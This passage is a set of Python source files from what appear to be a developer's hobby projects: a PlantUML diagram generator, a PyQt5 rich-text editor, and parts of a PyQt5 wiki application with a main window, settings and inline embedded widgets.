        "License :: OSI Approved :: MIT License",

        "Topic :: Communications",
    ],
    license='MIT',

    packages=find_packages('src'),
    package_dir={'': 'src'},

    zip_safe=False,
    include_package_data=True,

    test_suite='py.test',
    tests_require=["pytest"],
    extras_require={
        "test": [
            "pytest",
        ],
        "docs": [
            "sphinx",
            "sphinxcontrib-napoleon",
        ]
    },
)
#! /usr/bin/env python3


def indent(content):
    return "\n".join(
        "    " + line if line else line
        for line in content.splitlines()
    )


class Root(object):
    def __init__(self, items=None):
        self.items = items if items else []

    def add(self, item):
        self.items.append(item)

    def pick_all_connections(self):
        pass

    def to_str(self):
        items = "\n".join(
            item.to_str() for item in self.items
        )

        connections = []
        for item in self.items:
            connections.extend(item.get_connections())

        content = items + "\n".join(connections)
        return "@startuml\n%s\n@enduml" % content


class Base(object):
    def raw_connect(self, raw_connect):
        self.connections.append(raw_connect)

    def connect(self, item, pos=None, type="-->", desc=""):
        item_name = item.name

        if pos:
            assert pos in "dulr"
            type = type[:1] + pos + type[1:]

        if not desc:
            self.raw_connect("%s %s %s" % (self.name, type, item_name))
        else:
            self.raw_connect("%s %s %s: %s" % (self.name, type, item_name, desc))


class Class(Base):
    def __init__(self, name, alt_name=None, prop=None, methods=None):
        self.name = name
        self.alt_name = alt_name

        self._class_type = "class"

        self.properties = prop if prop else []
        self.methods = methods if methods else []
        self.connections = []

    def add_property(self, raw_property):
        self.properties.append(raw_property.strip())

    def add_method(self, raw_method):
        self.methods.append(raw_method)

    def get_connections(self):
        return self.connections

    def _get_alt_name(self):
        return '%s %s as "%s" {\n' % (self._class_type, self.name, self.alt_name)

    def to_str(self):
        if self.alt_name:
            o = self._get_alt_name()  # because object has this backwards
        else:
            o = '%s %s {\n' % (self._class_type, self.name)

        if self.properties or self.methods:
            for item in self.properties:
                o += indent(item)
                o += "\n"

            if self.methods:
                o += indent("--") + "\n"

                for item in self.methods:
                    o += indent(item)
                    o += "\n"

        o += '}\n\n'

        return o


class Abstract(Class):
    def __init__(self, name, alt_name=None, prop=None, methods=None):
        super(Abstract, self).__init__(name, alt_name=alt_name, prop=prop, methods=methods)
        self._class_type = "abstract"


class Interface(Class):
    def __init__(self, name, alt_name=None, prop=None, methods=None):
        super(Interface, self).__init__(name, alt_name=alt_name, prop=prop, methods=methods)
        self._class_type = "interface"


class Annotation(Class):
    def __init__(self, name, alt_name=None, prop=None, methods=None):
        super(Annotation, self).__init__(name, alt_name=alt_name, prop=prop, methods=methods)
        self._class_type = "annotation"


class Enum(Class):
    def __init__(self, name, alt_name=None, prop=None, methods=None):
        super(Enum, self).__init__(name, alt_name=alt_name, prop=prop, methods=methods)
        self._class_type = "enum"


class Object(Class):
    def __init__(self, name, alt_name=None, prop=None, methods=None):
        super(Object, self).__init__(name, alt_name=alt_name, prop=prop, methods=methods)
        self._class_type = "object"

    def _get_alt_name(self):
        return '%s "%s" as %s {\n' % (self._class_type, self.alt_name, self.name)


class Package(Base):
    def __init__(self, name, items=None):
        self.name = name
        self._package_type = "package"

        self.items = items if items else []
        self.connections = []

    def add(self, item):
        self.items.append(item)

    def get_connections(self):
        connections = self.connections[:]
        for item in self.items:
            connections.extend(item.get_connections())

        return connections

    def to_str(self):
        o = '%s %s {\n' % (self._package_type, self.name)

        for item in self.items:
            o += indent(item.to_str())

        o += "}\n\n"

        return o


class Node(Package):
    def __init__(self, name, items=None):
        super(Node, self).__init__(name, items)
        self._package_type = "node"


class Folder(Package):
    def __init__(self, name, items=None):
        super(Folder, self).__init__(name, items)
        self._package_type = "folder"


class Frame(Package):
    def __init__(self, name, items=None):
        super(Frame, self).__init__(name, items)
        self._package_type = "frame"


class Cloud(Package):
    def __init__(self, name, items=None):
        super(Cloud, self).__init__(name, items)
        self._package_type = "cloud"


class Database(Package):
    def __init__(self, name, items=None):
        super(Database, self).__init__(name, items)
        self._package_type = "database"


if __name__ == '__main__':
    c = Class("xe", prop=["prop"], methods=["+ .method()"])
    d = Object("xex")
    c.connect(d)

    p = Frame("test", [c, d])

    root = Root([p])
    print(root.to_str())
from PyQt5.QtGui import *
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtPrintSupport import *

import os
import sys
import uuid

FONT_SIZES = [7, 8, 9, 10, 11, 12, 13, 14, 18, 24, 36, 48, 64, 72, 96, 144, 288]
IMAGE_EXTENSIONS = ['.jpg','.png','.bmp']
HTML_EXTENSIONS = ['.htm', '.html']

def hexuuid():
    return uuid.uuid4().hex

def splitext(p):
    return os.path.splitext(p)[1].lower()

class TextEdit(QTextEdit):

    def canInsertFromMimeData(self, source):

        if source.hasImage():
            return True
        else:
            return super(TextEdit, self).canInsertFromMimeData(source)

    def insertFromMimeData(self, source):

        cursor = self.textCursor()
        document = self.document()

        if source.hasUrls():

            for u in source.urls():
                file_ext = splitext(str(u.toLocalFile()))
                if u.isLocalFile() and file_ext in IMAGE_EXTENSIONS:
                    image = QImage(u.toLocalFile())
                    document.addResource(QTextDocument.ImageResource, u, image)
                    cursor.insertImage(u.toLocalFile())

                else:
                    # If we hit a non-image or non-local URL break the loop and fall out
                    # to the super call & let Qt handle it
                    break

            else:
                # If all were valid images, finish here.
                return


        elif source.hasImage():
            image = source.imageData()
            uuid = hexuuid()
            document.addResource(QTextDocument.ImageResource, uuid, image)
            cursor.insertImage(uuid)
            return

        super(TextEdit, self).insertFromMimeData(source)


class MainWindow(QMainWindow):

    def __init__(self, *args, **kwargs):
        super(MainWindow, self).__init__(*args, **kwargs)

        layout = QVBoxLayout()
        self.editor = TextEdit()
        # Setup the QTextEdit editor configuration
        self.editor.setAutoFormatting(QTextEdit.AutoAll)
        self.editor.selectionChanged.connect(self.update_format)
        # Initialize default font size.
        font = QFont('Times', 12)
        self.editor.setFont(font)
        # We need to repeat the size to init the current format.
        self.editor.setFontPointSize(12)

        # self.path holds the path of the currently open file.
        # If none, we haven't got a file open yet (or creating new).
        self.path = None

        layout.addWidget(self.editor)

        container = QWidget()
        container.setLayout(layout)
        self.setCentralWidget(container)

        self.status = QStatusBar()
        self.setStatusBar(self.status)

        # Uncomment to disable native menubar on Mac
        # self.menuBar().setNativeMenuBar(False)

        file_toolbar = QToolBar("File")
        file_toolbar.setIconSize(QSize(14, 14))
        self.addToolBar(file_toolbar)
        file_menu = self.menuBar().addMenu("&File")

        open_file_action = QAction(QIcon(os.path.join('images', 'blue-folder-open-document.png')), "Open file...", self)
        open_file_action.setStatusTip("Open file")
        open_file_action.triggered.connect(self.file_open)
        file_menu.addAction(open_file_action)
        file_toolbar.addAction(open_file_action)

        save_file_action = QAction(QIcon(os.path.join('images', 'disk.png')), "Save", self)
        save_file_action.setStatusTip("Save current page")
        save_file_action.triggered.connect(self.file_save)
        file_menu.addAction(save_file_action)
        file_toolbar.addAction(save_file_action)

        saveas_file_action = QAction(QIcon(os.path.join('images', 'disk--pencil.png')), "Save As...", self)
        saveas_file_action.setStatusTip("Save current page to specified file")
        saveas_file_action.triggered.connect(self.file_saveas)
        file_menu.addAction(saveas_file_action)
        file_toolbar.addAction(saveas_file_action)

        print_action = QAction(QIcon(os.path.join('images', 'printer.png')), "Print...", self)
        print_action.setStatusTip("Print current page")
        print_action.triggered.connect(self.file_print)
        file_menu.addAction(print_action)
        file_toolbar.addAction(print_action)

        edit_toolbar = QToolBar("Edit")
        edit_toolbar.setIconSize(QSize(16, 16))
        self.addToolBar(edit_toolbar)
        edit_menu = self.menuBar().addMenu("&Edit")

        undo_action = QAction(QIcon(os.path.join('images', 'arrow-curve-180-left.png')), "Undo", self)
        undo_action.setStatusTip("Undo last change")
        undo_action.triggered.connect(self.editor.undo)
        edit_menu.addAction(undo_action)

        redo_action = QAction(QIcon(os.path.join('images', 'arrow-curve.png')), "Redo", self)
        redo_action.setStatusTip("Redo last change")
        redo_action.triggered.connect(self.editor.redo)
        edit_toolbar.addAction(redo_action)
        edit_menu.addAction(redo_action)

        edit_menu.addSeparator()

        cut_action = QAction(QIcon(os.path.join('images', 'scissors.png')), "Cut", self)
        cut_action.setStatusTip("Cut selected text")
        cut_action.setShortcut(QKeySequence.Cut)
        cut_action.triggered.connect(self.editor.cut)
        edit_toolbar.addAction(cut_action)
        edit_menu.addAction(cut_action)

        copy_action = QAction(QIcon(os.path.join('images', 'document-copy.png')), "Copy", self)
        copy_action.setStatusTip("Copy selected text")
        cut_action.setShortcut(QKeySequence.Copy)
        copy_action.triggered.connect(self.editor.copy)
        edit_toolbar.addAction(copy_action)
        edit_menu.addAction(copy_action)

        paste_action = QAction(QIcon(os.path.join('images', 'clipboard-paste-document-text.png')), "Paste", self)
        paste_action.setStatusTip("Paste from clipboard")
        cut_action.setShortcut(QKeySequence.Paste)
        paste_action.triggered.connect(self.editor.paste)
        edit_toolbar.addAction(paste_action)
        edit_menu.addAction(paste_action)

        select_action = QAction(QIcon(os.path.join('images', 'selection-input.png')), "Select all", self)
        select_action.setStatusTip("Select all text")
        cut_action.setShortcut(QKeySequence.SelectAll)
        select_action.triggered.connect(self.editor.selectAll)
        edit_menu.addAction(select_action)

        edit_menu.addSeparator()

        wrap_action = QAction(QIcon(os.path.join('images', 'arrow-continue.png')), "Wrap text to window", self)
        wrap_action.setStatusTip("Toggle wrap text to window")
        wrap_action.setCheckable(True)
        wrap_action.setChecked(True)
        wrap_action.triggered.connect(self.edit_toggle_wrap)
        edit_menu.addAction(wrap_action)

        format_toolbar = QToolBar("Format")
        format_toolbar.setIconSize(QSize(16, 16))
        self.addToolBar(format_toolbar)
        format_menu = self.menuBar().addMenu("&Format")

        # We need references to these actions/settings to update as selection changes, so attach to self.
        self.fonts = QFontComboBox()
        self.fonts.currentFontChanged.connect(self.editor.setCurrentFont)
        format_toolbar.addWidget(self.fonts)

        self.fontsize = QComboBox()
        self.fontsize.addItems([str(s) for s in FONT_SIZES])

        # Connect to the signal producing the text of the current selection. Convert the string to float
        # and set as the pointsize. We could also use the index + retrieve from FONT_SIZES.
        self.fontsize.currentIndexChanged[str].connect(lambda s: self.editor.setFontPointSize(float(s)) )
        format_toolbar.addWidget(self.fontsize)

        self.bold_action = QAction(QIcon(os.path.join('images', 'edit-bold.png')), "Bold", self)
        self.bold_action.setStatusTip("Bold")
        self.bold_action.setShortcut(QKeySequence.Bold)
        self.bold_action.setCheckable(True)
        self.bold_action.toggled.connect(lambda x: self.editor.setFontWeight(QFont.Bold if x else QFont.Normal))
        format_toolbar.addAction(self.bold_action)
        format_menu.addAction(self.bold_action)

        self.italic_action = QAction(QIcon(os.path.join('images', 'edit-italic.png')), "Italic", self)
        self.italic_action.setStatusTip("Italic")
        self.italic_action.setShortcut(QKeySequence.Italic)
        self.italic_action.setCheckable(True)
        self.italic_action.toggled.connect(self.editor.setFontItalic)
        format_toolbar.addAction(self.italic_action)
        format_menu.addAction(self.italic_action)

        self.underline_action = QAction(QIcon(os.path.join('images', 'edit-underline.png')), "Underline", self)
        self.underline_action.setStatusTip("Underline")
        self.underline_action.setShortcut(QKeySequence.Underline)
        self.underline_action.setCheckable(True)
        self.underline_action.toggled.connect(self.editor.setFontUnderline)
        format_toolbar.addAction(self.underline_action)
        format_menu.addAction(self.underline_action)

        format_menu.addSeparator()

        self.alignl_action = QAction(QIcon(os.path.join('images', 'edit-alignment.png')), "Align left", self)
        self.alignl_action.setStatusTip("Align text left")
        self.alignl_action.setCheckable(True)
        self.alignl_action.triggered.connect(lambda: self.editor.setAlignment(Qt.AlignLeft))
        format_toolbar.addAction(self.alignl_action)
        format_menu.addAction(self.alignl_action)

        self.alignc_action = QAction(QIcon(os.path.join('images', 'edit-alignment-center.png')), "Align center", self)
        self.alignc_action.setStatusTip("Align text center")
        self.alignc_action.setCheckable(True)
        self.alignc_action.triggered.connect(lambda: self.editor.setAlignment(Qt.AlignCenter))
        format_toolbar.addAction(self.alignc_action)
        format_menu.addAction(self.alignc_action)

        self.alignr_action = QAction(QIcon(os.path.join('images', 'edit-alignment-right.png')), "Align right", self)
        self.alignr_action.setStatusTip("Align text right")
        self.alignr_action.setCheckable(True)
        self.alignr_action.triggered.connect(lambda: self.editor.setAlignment(Qt.AlignRight))
        format_toolbar.addAction(self.alignr_action)
        format_menu.addAction(self.alignr_action)

        self.alignj_action = QAction(QIcon(os.path.join('images', 'edit-alignment-justify.png')), "Justify", self)
        self.alignj_action.setStatusTip("Justify text")
        self.alignj_action.setCheckable(True)
        self.alignj_action.triggered.connect(lambda: self.editor.setAlignment(Qt.AlignJustify))
        format_toolbar.addAction(self.alignj_action)
        format_menu.addAction(self.alignj_action)

        format_group = QActionGroup(self)
        format_group.setExclusive(True)
        format_group.addAction(self.alignl_action)
        format_group.addAction(self.alignc_action)
        format_group.addAction(self.alignr_action)
        format_group.addAction(self.alignj_action)

        format_menu.addSeparator()

        # A list of all format-related widgets/actions, so we can disable/enable signals when updating.
        self._format_actions = [
            self.fonts,
            self.fontsize,
            self.bold_action,
            self.italic_action,
            self.underline_action,
            # We don't need to disable signals for alignment, as they are paragraph-wide.
        ]

        # Initialize.
        self.update_format()
        self.update_title()
        self.show()

    def block_signals(self, objects, b):
        for o in objects:
            o.blockSignals(b)

    def update_format(self):
        """
        Update the font format toolbar/actions when a new text selection is made. This is neccessary to keep
        toolbars/etc. in sync with the current edit state.
        :return:
        """
        # Disable signals for all format widgets, so changing values here does not trigger further formatting.
        self.block_signals(self._format_actions, True)

        self.fonts.setCurrentFont(self.editor.currentFont())
        # Nasty, but we get the font-size as a float but want it was an int
        self.fontsize.setCurrentText(str(int(self.editor.fontPointSize())))

        self.italic_action.setChecked(self.editor.fontItalic())
        self.underline_action.setChecked(self.editor.fontUnderline())
        self.bold_action.setChecked(self.editor.fontWeight() == QFont.Bold)

        self.alignl_action.setChecked(self.editor.alignment() == Qt.AlignLeft)
        self.alignc_action.setChecked(self.editor.alignment() == Qt.AlignCenter)
        self.alignr_action.setChecked(self.editor.alignment() == Qt.AlignRight)
        self.alignj_action.setChecked(self.editor.alignment() == Qt.AlignJustify)

        self.block_signals(self._format_actions, False)

    def dialog_critical(self, s):
        dlg = QMessageBox(self)
        dlg.setText(s)
        dlg.setIcon(QMessageBox.Critical)
        dlg.show()

    def file_open(self):
        path, _ = QFileDialog.getOpenFileName(self, "Open file", "", "HTML documents (*.html);Text documents (*.txt);All files (*.*)")

        try:
            with open(path, 'rU') as f:
                text = f.read()

        except Exception as e:
            self.dialog_critical(str(e))

        else:
            self.path = path
            # Qt will automatically try and guess the format as txt/html
            self.editor.setText(text)
            self.update_title()

    def file_save(self):
        if self.path is None:
            # If we do not have a path, we need to use Save As.
            return self.file_saveas()

        text = self.editor.toHtml() if splitext(self.path) in HTML_EXTENSIONS else self.editor.toPlainText()

        try:
            with open(self.path, 'w') as f:
                f.write(text)

        except Exception as e:
            self.dialog_critical(str(e))

    def file_saveas(self):
        path, _ = QFileDialog.getSaveFileName(self, "Save file", "", "HTML documents (*.html);Text documents (*.txt);All files (*.*)")

        if not path:
            # If dialog is cancelled, will return ''
            return

        text = self.editor.toHtml() if splitext(path) in HTML_EXTENSIONS else self.editor.toPlainText()

        try:
            with open(path, 'w') as f:
                f.write(text)

        except Exception as e:
            self.dialog_critical(str(e))

        else:
            self.path = path
            self.update_title()

    def file_print(self):
        dlg = QPrintDialog()
        if dlg.exec_():
            self.editor.print_(dlg.printer())

    def update_title(self):
        self.setWindowTitle("%s - Megasolid Idiom" % (os.path.basename(self.path) if self.path else "Untitled"))

    def edit_toggle_wrap(self):
        self.editor.setLineWrapMode( 1 if self.editor.lineWrapMode() == 0 else 0 )


if __name__ == '__main__':

    app = QApplication(sys.argv)
    app.setApplicationName("Megasolid Idiom")

    window = MainWindow()
    app.exec_()#! /usr/bin/env python3
import sys

from PyQt5.QtWidgets import QApplication

from widgets.main_window import MainWindow


if __name__ == '__main__':
    app = QApplication(sys.argv)
    gui = MainWindow()
    gui.show()

    sys.exit(app.exec_())
from functools import wraps
from collections import namedtuple


class ShortcutInfo(namedtuple("ShortcutInfo", "name shortcut action description")):
    pass


class Shortcuts:
    def __init__(self):
        self.all_shortcuts = {}

    def add_shorcut(self, name, shortcut, action, description=None):
        self.all_shortcuts[name] = ShortcutInfo(name, shortcut, action, description)
        action.setShortcut(shortcut)


class Settings:
    def __init__(self):
        self.shortcuts = Shortcuts()

    @wraps(Shortcuts.add_shorcut)
    def add_shortcut(self, *args, **kwargs):
        return self.shortcuts.add_shorcut(*args, **kwargs)


settings = Settings()
from PyQt5.QtCore import QSize
from PyQt5.QtWidgets import QMainWindow
from PyQt5.QtWidgets import QSizePolicy
from PyQt5.QtWidgets import QSpacerItem

from widgets.input_bar import InputBar
from widgets.main_window_resource.main_window import Ui_MainWindow


class MainWindow(QMainWindow, Ui_MainWindow):
    def __init__(self, parent=None):
        super(MainWindow, self).__init__(parent)
        self.setupUi(self)

        self.tool_bar.setIconSize(QSize(20, 20))
        self.tool_bar.setFixedHeight(36)

        # self.render_page("test", None)
        self.render_dummy_load("test", None)

        self.input_bar = None

    def render_page(self, title, page):
        self._clear_node_layout()
        self._render_name_of_the_node("test")

        for _ in range(50):
            ibar = InputBar(self)
            self.layout_full_content.addWidget(ibar)

        spacer = QSpacerItem(20, 40, QSizePolicy.Minimum, QSizePolicy.Expanding)
        self.layout_full_content.addItem(spacer)

    def render_dummy_load(self, title, page):
        self._clear_node_layout()
        self._render_name_of_the_node("test")

        for _ in range(50):
            ibar = InputBar(self)
            self.layout_full_content.addWidget(ibar)

        spacer = QSpacerItem(20, 40, QSizePolicy.Minimum, QSizePolicy.Expanding)
        self.layout_full_content.addItem(spacer)

    def _clear_node_layout(self):
        while self.layout_full_content.count():
            child = self.layout_full_content.takeAt(0)
            if child.widget():
                child.widget().deleteLater()

        self.layout_full_content.addLayout(self.layout_node_name)

    def _render_name_of_the_node(self, name):
        self.label_node_name.setText(name)

    def set_active_input_bar(self, input_bar):
        self.input_bar = input_bar
        self.input_bar.register_toolbar(self.tool_bar)
#! /usr/bin/env python3
from PyQt5 import QtCore
from PyQt5.QtGui import QPen
from PyQt5.QtGui import QTextCursor
from PyQt5.QtGui import QTextFormat
from PyQt5.QtGui import QTextCharFormat
from PyQt5.QtGui import QTextObjectInterface
from PyQt5.QtCore import Qt
from PyQt5.QtCore import QObject
from PyQt5.QtWidgets import QWidget
from PyQt5.QtWidgets import QLineEdit
from PyQt5.QtWidgets import QTextEdit
from PyQt5.QtWidgets import QVBoxLayout
from PyQt5.QtWidgets import QApplication


class InlinedWidgetInfo:
    object_replacement_character = chr(0xfffc)
    _instance_counter = 0

    def __init__(self, widget):
        self.widget = widget

        self.text_format_id = QTextFormat.UserObject + InlinedWidgetInfo._instance_counter
        self.char = self.object_replacement_character

        InlinedWidgetInfo._instance_counter += 1


class ExampleWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('Example window')
        self.wysiwyg_editor = QTextEdit()

        layout = QVBoxLayout()
        layout.addWidget(self.wysiwyg_editor)
        self.setLayout(layout)

        cursor = self.wysiwyg_editor.textCursor()
        cursor.insertText('beginning\n')

        widget = QLineEdit(self.wysiwyg_editor)
        widget.setText('First')
        widget.hide()

        widget2 = QLineEdit(self.wysiwyg_editor)
        widget2.setText('Second')
        widget2.hide()

        inlined_widget_wrapper = InlinedWidgetInfo(widget)
        inlined_widget_wrapper2 = InlinedWidgetInfo(widget2)

        self.last_text_lenght = 0
        self.text_format_id_to_inlined_widget_map = {}

        cursor.insertText('\n\n')
        self.wrap_with_text_object(inlined_widget_wrapper)
        self.insert_text_object(cursor, inlined_widget_wrapper)
        cursor.insertText('\n\n')
        self.wrap_with_text_object(inlined_widget_wrapper2)
        self.insert_text_object(cursor, inlined_widget_wrapper2)

        cursor.insertText('\n\n')
        cursor.insertText('end')
        self.wysiwyg_editor.setTextCursor(cursor)

        self.wysiwyg_editor.currentCharFormatChanged.connect(self.on_character_format_change)
        self.wysiwyg_editor.selectionChanged.connect(self._trigger_obj_char_rescan)
        self.wysiwyg_editor.textChanged.connect(self.on_text_changed)

    def wrap_with_text_object(self, inlined_widget):
        class TextObject(QObject, QTextObjectInterface):
            def intrinsicSize(self, doc, pos_in_document, format):
                return QtCore.QSizeF(inlined_widget.widget.sizeHint())

            def drawObject(_self, painter, rect, doc, pos_in_document, format):
                inlined_widget.widget.resize(inlined_widget.widget.sizeHint())
                painter.setPen(QPen(Qt.white))
                painter.drawRect(rect)
                inlined_widget.widget.move(rect.x(), rect.y())

        document_layout = self.wysiwyg_editor.document().documentLayout()
        document_layout.registerHandler(inlined_widget.text_format_id, TextObject(self))
        self.text_format_id_to_inlined_widget_map[inlined_widget.text_format_id] = inlined_widget

    def insert_text_object(self, cursor, inlined_widget):
        char_format = QTextCharFormat()
        char_format.setObjectType(inlined_widget.text_format_id)
        cursor.insertText(inlined_widget.char, char_format)
        inlined_widget.widget.show()

    def on_character_format_change(self, qtextcharformat):
        text_format_id = qtextcharformat.objectType()

        # id 0 is used when the object is deselected - I don't really want the id
        # itself, I just want to know that there was some change AFTER it was done
        if text_format_id == 0:
            self._trigger_obj_char_rescan()

    def on_text_changed(self):
        current_text_lenght = len(self.wysiwyg_editor.toPlainText())
        if self.last_text_lenght > current_text_lenght:
            self._trigger_obj_char_rescan()

        self.last_text_lenght = current_text_lenght

    def _trigger_obj_char_rescan(self):
        text = self.wysiwyg_editor.toPlainText()
        character_indexes = [
            cnt for cnt, char in enumerate(text)
            if char == InlinedWidgetInfo.object_replacement_character
        ]

        # get text_format_id for all OBJECT REPLACEMENT CHARACTERs
        present_text_format_ids = set()
        for index in character_indexes:
            cursor = QTextCursor(self.wysiwyg_editor.document())

            # I have to create text selection in order to detect correct character
            cursor.setPosition(index)
            if index < len(text):
                cursor.setPosition(index + 1, QTextCursor.KeepAnchor)

            text_format_id = cursor.charFormat().objectType()

            present_text_format_ids.add(text_format_id)

        # diff for characters that are there and that should be there
        expected_text_format_ids = set(self.text_format_id_to_inlined_widget_map.keys())
        removed_text_ids = expected_text_format_ids - present_text_format_ids

        # hide widgets for characters that were removed
        for text_format_id in removed_text_ids:
            inlined_widget = self.text_format_id_to_inlined_widget_map[text_format_id]
            inlined_widget.widget.hide()
            del self.text_format_id_to_inlined_widget_map[text_format_id]


if __name__ == '__main__':
    import sys
    app = QApplication(sys.argv)
    window = ExampleWindow()
    window.show()
    sys.exit(app.exec_())# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'main_window.ui'
#
# Created by: PyQt5 UI code generator 5.10.1
#
# WARNING! All changes made in this file will be lost!

from PyQt5 import QtCore, QtGui, QtWidgets

class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(1600, 1200)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.gridLayout = QtWidgets.QGridLayout(self.centralwidget)
        self.gridLayout.setSizeConstraint(QtWidgets.QLayout.SetMinimumSize)
        self.gridLayout.setContentsMargins(0, 0, 0, 0)
        self.gridLayout.setObjectName("gridLayout")
        self.horizontalLayout = QtWidgets.QHBoxLayout()
        self.horizontalLayout.setSizeConstraint(QtWidgets.QLayout.SetMinimumSize)
        self.horizontalLayout.setSpacing(2)
        self.horizontalLayout.setObjectName("horizontalLayout")
        self.node_tree = QtWidgets.QTreeWidget(self.centralwidget)
        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Preferred, QtWidgets.QSizePolicy.Expanding)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.node_tree.sizePolicy().hasHeightForWidth())
        self.node_tree.setSizePolicy(sizePolicy)
        self.node_tree.setMinimumSize(QtCore.QSize(0, 0))
        self.node_tree.setMaximumSize(QtCore.QSize(200, 16777215))
        self.node_tree.setObjectName("node_tree")
        item_0 = QtWidgets.QTreeWidgetItem(self.node_tree)
        item_1 = QtWidgets.QTreeWidgetItem(item_0)
        item_0 = QtWidgets.QTreeWidgetItem(self.node_tree)
        self.node_tree.header().setVisible(False)
        self.horizontalLayout.addWidget(self.node_tree)
        self.content = QtWidgets.QScrollArea(self.centralwidget)
        self.content.setWidgetResizable(True)
        self.content.setObjectName("content")
        self.scrollAreaWidgetContents = QtWidgets.QWidget()
        self.scrollAreaWidgetContents.setGeometry(QtCore.QRect(0, 0, 1394, 1119))
        self.scrollAreaWidgetContents.setObjectName("scrollAreaWidgetContents")
        self.gridLayout_2 = QtWidgets.QGridLayout(self.scrollAreaWidgetContents)
        self.gridLayout_2.setContentsMargins(0, 0, 0, 0)
        self.gridLayout_2.setObjectName("gridLayout_2")
        self.frame = QtWidgets.QFrame(self.scrollAreaWidgetContents)
        self.frame.setStyleSheet("background: white;")
        self.frame.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.frame.setFrameShadow(QtWidgets.QFrame.Plain)
        self.frame.setLineWidth(0)
        self.frame.setObjectName("frame")
        self.gridLayout_3 = QtWidgets.QGridLayout(self.frame)
        self.gridLayout_3.setContentsMargins(0, 0, 0, 0)
        self.gridLayout_3.setObjectName("gridLayout_3")
        self.layout_full_content = QtWidgets.QVBoxLayout()
        self.layout_full_content.setSpacing(0)
        self.layout_full_content.setObjectName("layout_full_content")
        self.layout_node_name = QtWidgets.QHBoxLayout()
        self.layout_node_name.setObjectName("layout_node_name")
        spacerItem = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.layout_node_name.addItem(spacerItem)
        self.label_node_name = QtWidgets.QLabel(self.frame)
        font = QtGui.QFont()
        font.setPointSize(18)
        font.setBold(True)
        font.setUnderline(True)
        font.setWeight(75)
        font.setKerning(False)
        self.label_node_name.setFont(font)
        self.label_node_name.setObjectName("label_node_name")
        self.layout_node_name.addWidget(self.label_node_name)
        spacerItem1 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.layout_node_name.addItem(spacerItem1)
        self.layout_full_content.addLayout(self.layout_node_name)
        spacerItem2 = QtWidgets.QSpacerItem(20, 40, QtWidgets.QSizePolicy.Minimum, QtWidgets.QSizePolicy.Expanding)
        self.layout_full_content.addItem(spacerItem2)
        self.gridLayout_3.addLayout(self.layout_full_content, 0, 0, 1, 1)
        self.gridLayout_2.addWidget(self.frame, 0, 0, 1, 1)
        self.content.setWidget(self.scrollAreaWidgetContents)
        self.horizontalLayout.addWidget(self.content)
        self.gridLayout.addLayout(self.horizontalLayout, 0, 0, 1, 1)
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 1600, 23))
        self.menubar.setObjectName("menubar")
        self.menuFile = QtWidgets.QMenu(self.menubar)
        self.menuFile.setObjectName("menuFile")
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)
        self.tool_bar = QtWidgets.QToolBar(MainWindow)
        self.tool_bar.setEnabled(True)
        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Preferred, QtWidgets.QSizePolicy.Maximum)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.tool_bar.sizePolicy().hasHeightForWidth())
        self.tool_bar.setSizePolicy(sizePolicy)
        self.tool_bar.setMinimumSize(QtCore.QSize(0, 32))
        self.tool_bar.setMovable(False)
        self.tool_bar.setIconSize(QtCore.QSize(32, 32))
        self.tool_bar.setFloatable(False)
        self.tool_bar.setObjectName("tool_bar")
        MainWindow.addToolBar(QtCore.Qt.TopToolBarArea, self.tool_bar)
        self.actionQuit = QtWidgets.QAction(MainWindow)
        self.actionQuit.setObjectName("actionQuit")
        self.menuFile.addAction(self.actionQuit)
        self.menubar.addAction(self.menuFile.menuAction())

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "objWiki"))
        self.node_tree.headerItem().setText(0, _translate("MainWindow", "Tree"))
        __sortingEnabled = self.node_tree.isSortingEnabled()
        self.node_tree.setSortingEnabled(False)
        self.node_tree.topLevelItem(0).setText(0, _translate("MainWindow", "First"))
        self.node_tree.topLevelItem(0).child(0).setText(0, _translate("MainWindow", "Subnode"))
        self.node_tree.topLevelItem(1).setText(0, _translate("MainWindow", "Second"))
        self.node_tree.setSortingEnabled(__sortingEnabled)
        self.label_node_name.setText(_translate("MainWindow", "TextLabel"))
        self.menuFile.setTitle(_translate("MainWindow", "File"))
        self.tool_bar.setWindowTitle(_translate("MainWindow", "toolBar"))
        self.actionQuit.setText(_translate("MainWindow", "Quit"))

#! /usr/bin/env python3
from PyQt5 import QtCore
from PyQt5 import QtWidgets
from PyQt5.QtGui import QFont
from PyQt5.QtGui import QIcon
from PyQt5.QtWidgets import QAction
from PyQt5.QtWidgets import QLineEdit

from modules.settings import settings
from widgets.input_bar_resource.basic_input import Ui_InputBar

from .embeded_widget_handler import EmbeddedWidgetHandler


class InputBar(Ui_InputBar, EmbeddedWidgetHandler):
    toolbar = None

    def __init__(self, parent):
        super(InputBar, self).__init__(parent)
        self.setupUi(self)

        self.main_window = parent
        self.show()

        self.connect_signals()

    @property
    def editor_widget(self):
        return self.wysiwyg_widget

    @classmethod
    def add_toolbar(cls, main_window):
        """
        Add new toolbar to main window.

        Args:
            main_window:

        Returns:
            QtWidgets.QToolBar: Instance of the toolbar.
        """
        tool_bar = QtWidgets.QToolBar(main_window)
        tool_bar.setEnabled(True)
